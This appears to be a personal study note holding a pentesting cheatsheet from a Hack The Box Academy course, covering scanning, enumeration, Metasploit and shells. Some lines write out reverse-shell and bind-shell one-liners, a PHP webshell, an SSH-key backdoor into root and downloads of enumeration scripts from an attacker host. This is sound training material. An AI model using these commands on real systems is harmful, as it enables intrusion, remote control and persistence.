
2025-09-19 20:41

Status:

Tags: [[vpn]], [[tools]], [[commands]],[[cheatsheet]]


# Basic Tools Cheatsheet

## Pentesting


````markdown

```bash
sudo openvpn user.ovpn
````

Connect to VPN.

```bash
ifconfig
```

Show IP address (classic).

```bash
ip a
```

Show IP address (modern).

```bash
netstat -rn
```

Show networks accessible via the VPN.

```bash
ssh user@10.10.10.10
```

SSH to a remote server.

```bash
ftp 10.129.42.253
```

FTP to a remote server.

---

## 📟 Tmux (multiplexer)

```bash
tmux
```

Start tmux session.

---

## ✍️ Vim Basics

```bash
vim file
```

Open `file` with vim.

```bash
esc + i
```

Enter insert mode.

```bash
esc
```

Return to normal mode.

```bash
x
```

Cut character.

```bash
dw
```

Cut word.

```bash
dd
```

Cut full line.

```bash
yw
```

Copy word.

```bash
yy
```

Copy full line.

```bash
p
```

Paste.

```bash
:1
```

Go to line 1.

```bash
:w
```

Write file (save).

```bash
:q
```

Quit.

```bash
:q!
```

Quit without saving.

```bash
:wq
```

Write and quit.

---

# 🔍 Pentesting Cheatsheet

## 🔧 Service Scanning

```bash
nmap 10.129.42.253
```

Run nmap on an IP.

```bash
nmap -sV -sC -p- 10.129.42.253
```

Run a full script scan on an IP.

```bash
locate scripts/citrix
```

List available nmap scripts.

```bash
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```

Run an nmap SMB script.

```bash
nc 10.10.10.10 22
```

Grab banner of an open port.

```bash
smbclient -N -L \\\\10.129.42.253
```

List SMB shares.

```bash
smbclient \\\\10.129.42.253\\users -U username
```

Connect to an SMB share.

```bash
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
```

Scan SNMP.

```bash
onesixtyone -c dict.txt 10.129.42.254
```

Brute-force SNMP community strings.

---

## 🌐 Web Enumeration

```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
```

Directory scan.

```bash
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

Subdomain scan.

```bash
curl -IL https://www.inlanefreight.com
```

Grab website banner.

```bash
whatweb 10.10.10.121
```

Identify web technologies.

```bash
curl 10.10.10.121/robots.txt
```

Check `robots.txt`.

_(Browser)_  
Press `Ctrl+U` → View page source.

---

## 💥 Public Exploits

```bash
searchsploit openssh 7.2
```

Search for public exploits.

```bash
msfconsole
```

Start Metasploit.

```bash
search exploit eternalblue
```

Search for exploit in MSF.

```bash
use exploit/windows/smb/ms17_010_psexec
```

Use MSF module.

```bash
show options
```

Show module options.

```bash
set RHOSTS 10.10.10.40
```

Set target IP.

```bash
check
```

Test if vulnerable.

```bash
exploit
```

Run the exploit.

---

## 🐚 Using Shells

```bash
nc -lvnp 1234
```

Start listener.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

Send reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Reverse shell via FIFO.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Start bind shell.

```bash
nc 10.10.10.1 1234
```

Connect to bind shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Upgrade to TTY shell.

_(Stable TTY upgrade #2)_  
Press `Ctrl+Z` then:

```bash
stty raw -echo; fg
```

Then:

```bash
export TERM=xterm-256color
stty rows 67 columns 318
```

```bash
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
```

Create PHP webshell.

```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

Execute command via webshell.

---

## 🔑 Privilege Escalation

```bash
./linpeas.sh
```

Run linpeas enumeration.

```bash
sudo -l
```

List sudo privileges.

```bash
sudo -u user /bin/echo Hello World!
```

Run command as another user.

```bash
sudo su -
```

Switch to root.

```bash
sudo su user -
```

Switch to user.

```bash
ssh-keygen -f key
```

Generate SSH key.

```bash
echo "ssh-rsa AAAAB...SNIP..." >> /root/.ssh/authorized_keys
```

Add SSH public key.

```bash
ssh root@10.10.10.10 -i key
```

Login with SSH key.

---

## 📤 Transferring Files

```bash
python3 -m http.server 8000
```

Start webserver.

```bash
wget http://10.10.14.1:8000/linpeas.sh
```

Download file via wget.

```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

Download file via curl.

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

Transfer via scp.

```bash
base64 shell -w 0
```

Encode file to base64.

```bash
echo f0VMR...SNIP... | base64 -d > shell
```

Decode base64 back to file.

```bash
md5sum shell
```

Check md5 hash.


# References
- https://academy.hackthebox.com/module/77/section/723
- https://academy.hackthebox.com/module/cheatsheet/77